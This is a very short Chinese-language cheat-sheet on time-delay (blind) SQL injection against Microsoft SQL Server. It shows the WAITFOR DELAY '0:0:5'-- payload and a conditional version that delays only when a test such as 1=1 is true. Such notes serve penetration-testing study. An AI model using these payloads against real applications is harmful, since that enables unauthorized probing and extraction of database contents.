# mssql数据库延时注入

+ 延时语法
```mssql
WAITFOR DELAY '0:0:5'--
```

+ if语句
```mssql
if (判断句) WAITFOR DELAY '0:0:5'--
事例：
if (1=1) waitfor delay '0:0:5'--     #如果1=1 那么延时5秒
```
